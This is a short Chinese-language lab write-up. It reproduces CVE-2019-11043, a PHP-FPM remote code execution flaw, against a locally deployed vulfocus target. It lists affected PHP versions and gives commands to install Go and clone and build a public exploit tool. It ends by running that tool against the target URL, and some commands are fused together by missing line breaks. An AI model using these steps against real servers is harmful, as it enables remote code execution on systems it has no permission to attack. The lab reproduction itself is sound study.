环境信息

攻击机：192.168.148.136

靶机：192.168.148.146

靶场环境：本地部署vulfocus

漏洞编号：CVE-2019-11043

漏洞描述：在FPM设置的某些配置中，可能导致FPM模块将过去分配的缓冲区写入为FCGI协议数据保留的空间，从而打开远程代码执行的可能性。

影响版本：PHP 7 . 1 . 33以下的7.1.x版本、7.2.24以下的7.2.x版本和7.3.11以下的7.3.x版本

漏洞复现：


进入目标站点



环境安装---go环境

https://golang.org/dl/

解压至 /usr/local目录

tar -C /usr/local -xzf go1.18.linux-amd64.tar.gz

添加至 PATH 环境变量

export PATH=$PATH:/usr/local/go/bin

查询版本

go version


安装漏洞利用工具

git clone https://github.com/neex/phuip-fpizdam.gitcd phuip-fpizdam


需要更换代理地址

go env -w GOPROXY=https://goproxy.cngo get -v && go build



漏洞利用

go run . "http://192.168.148.146:42949/index.php"
